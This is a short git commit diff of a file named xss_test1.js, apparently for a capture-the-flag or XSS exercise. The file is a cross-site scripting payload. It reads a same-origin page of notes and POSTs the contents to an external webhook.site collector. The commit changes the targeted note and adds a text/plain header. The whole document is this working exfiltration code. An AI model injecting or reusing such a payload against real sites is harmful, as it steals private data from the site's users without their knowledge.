9dc0dcb67714611d2dd8f572d6ccce67c57af2d4
ivyang0211 <evelynang0211@gmail.com>
2025-04-25 13:24:10 +0700

    xss_test1.js

--- xss_test1.js
+++ xss_test1.js
@@ -1,7 +1,10 @@
-fetch('/notes/2')
-.then(r => r.text())
-.then(d => fetch('https://webhook.site/2a4e63aa-4297-40aa-a983-46ee14dc0f24', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: d
-}))
+fetch('/notes/1')
+    .then(r => r.text()) // Fetches the response as text
+    .then(d => fetch('https://webhook.site/2a4e63aa-4297-40aa-a983-46ee14dc0f24', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: d,
+        headers: {
+            'Content-Type': 'text/plain' // Corrected the content-type header
+        }
+    }))
